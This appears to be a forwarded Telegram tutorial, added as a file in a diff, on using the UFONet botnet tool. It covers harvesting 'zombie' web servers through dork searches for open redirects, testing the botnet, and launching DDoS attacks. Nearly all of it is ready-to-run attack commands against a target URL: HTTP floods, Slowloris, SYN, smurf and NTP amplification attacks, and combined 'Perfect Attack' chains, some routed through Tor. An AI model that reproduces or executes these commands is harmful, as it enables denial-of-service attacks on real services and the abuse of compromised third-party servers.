@@ -1,0 +1,110 @@
+Forward from LEAKERHOUR(tele)
+
+Let's find zombies 🧟‍♂️
+
+1️⃣. Method - Download Zombies
+
+To download zombies, we are using following command:
+
+$ ufonet --download-github
+[AI] Do you want to merge ONLY the new 'troops' into your army? (Y/n)y
+
+2️⃣. Method - Search Zombies
+
+Automated Search: 🕵️
+$ ufonet --auto-search
+
+Dorkslist Search 🔍
+$ kwrite botnet/dorks.txt
+Apply some dorks for botnet... i have some here:
+https://pastebin.com/bXZiCMpK
+$ ufonet --sd 'dorks.txt' --se 'bing'
+--sa (search all : using all search engine, but take time)
+--se 'duckduckgo'
+--se 'bing'
+--se 'yahoo'
+
+$ ufonet --sd 'dorks.txt' --sa
+Single dork : 🔎
+$ ufonet --sd 'dorks.txt' -s 'proxy.php?url='
+
+Tools 🔩
+
+1️⃣ --crypter is for encrypting text, you need your key from 127.0.0.1:9999/gui
+2️⃣ --network is for showing your network info (MAC, IP Public & Private)
+3️⃣ --xray is a fast port scanner, used by:
+$ ufonet --xray 'https://target.com/' 
+
+Options ⚙️
+
+1️⃣ --help prints help menu
+2️⃣ --example shows you examples
+3️⃣ --update updates the tool
+4️⃣ --check-tor checks if tor is running
+5️⃣ --force-ssl forces only ssl requests
+6️⃣ --gui start the web interface
+
+Test Botnet 🧑‍💻
+To test botnet for it functionality we have choice to use different options:
+1️⃣ --test-offline tests offline bots 
+2️⃣ --test-all this not only testing zombies, it test all bots (take time depends on internet)
+3️⃣ -t TEST_FILE will test single text file such as:
+$ ufonet -t botnet/humans.txt
+
+Community 👾
+1️⃣ --grider creates a grider to share messages from /stats/wargames/messages
+2️⃣ --blackhole generate a blackhole to share zombies (web interface -> 127.0.0.1:9999/ranking -> Blackhole/IP -> Download)
+Some of the community commands aren't working, please use --gui for web interface to complete it.
+
+Configure Attacks ⚛️
+1️⃣ -a TARGET DDoS an URL,such as:
+$ ufonet -a https://target.com
+2️⃣ -f TAGET_LIST DDoS a list of target, -f target.txt
+3️⃣ -r ROUNDS Set rounds to attack such as:
+$ ufonet -a https://target.com -r 100
+
+Extra Attacks ⛓
+1️⃣ --loic http fast attack, such as:
+$ ufonet -a https://target.com -r 100 --loic 100
+2️⃣ --loris http slow attack, such as:
+$ ufonet -a https://target.com -r 100 --loris 100
+3️⃣ --ufosyn tcp syn flood attack, such as:
+$ ufonet -a https://target.com -r 100 --ufosyn 100
+4️⃣ --nuke tcp starvation attack, such as:
+$ ufonet -a https://target.com -r 100 --nuke 10000
+
+Example Attacks 🔥
+
+1️⃣ Small Attack:
+$ ufonet -a https://target.com -r 100
+1 zombies x 100 = 100 requests.
+
+2️⃣ Tor Attack:
+$ ufonet -a https://target.com -r 100 --proxy="http://127.0.0.1:8188"
+
+3️⃣ With Threads:
+$ ufonet -a https://target.com -r 100 --threads 300 --proxy="http://127.0.0.1:8188"
+(if it's not working shrink the threads or delete tor)
+
+4️⃣ SYN Attack:
+$ ufonet -a https://target.com -r 250 --threads 150 --ufosyn 100
+
+
+5️⃣ LOIC Attack:
+$ ufonet -a https://target.com -r 250 --threads 150 --loic 100
+
+6️⃣ ICMP Attack:
+$ ufonet -a https://target.com -r 250 --threads 150 --smurf 100 
+
+7️⃣ Powerful Attack:
+$ ufonet -a https://target.com -r 250 --threads 150 --nuke 10000
+
+8️⃣ NTP Traffic Attack:
+$ ufonet -a https://target.com -r 250 --threads 150 --monlist 1000
+
+9️⃣ Rising Hell Attack:
+$ ufonet -a https://target.com -r 5 --threads 50 --force-ssl --spray 100 --smurf 100 --tachyon 1000 --monlist 1001 --loic 100 --loris 101 --ufosyn 100 --xmas 100 --nuke 10000
+
+🔟 Perfect Attack:
+$ ufonet -a https://target.com -r 5 --threads 50 --force-ssl --delay 1 --timeout 3 --expire 25 --no-scan --spray 100 --smurf 100 --tachyon 1000 --monlist 1001 --loic 100 --loris 101 --ufosyn 100 --xmas 100 --nuke 10000
+
